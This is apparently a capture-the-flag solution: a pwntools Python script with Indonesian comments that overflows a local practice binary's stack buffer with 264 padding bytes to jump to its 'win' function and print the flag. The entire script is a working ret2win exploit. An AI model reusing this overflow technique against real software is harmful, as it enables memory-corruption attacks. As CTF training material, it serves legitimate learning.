from pwn import *

context.log_level = "error"
elf = context.binary = ELF("./vuln")
win = 0x4011f6 # bisa diganti dengan elf.sym.win
poprdi = 0x40101a
ret = 0x40101a

buff = 264
padding = b'A'*buff
pay = flat(
    padding,
    win,
    ret,             # ret dan elf.sym.greet ini tidak wajib, 
    elf.sym.greet    # hanya semacam penambahan rop chain agar program berakhir dengan keren dan ga crash setelah print flag

)

p = process("./vuln")
p.sendline(pay)
p.interactive()
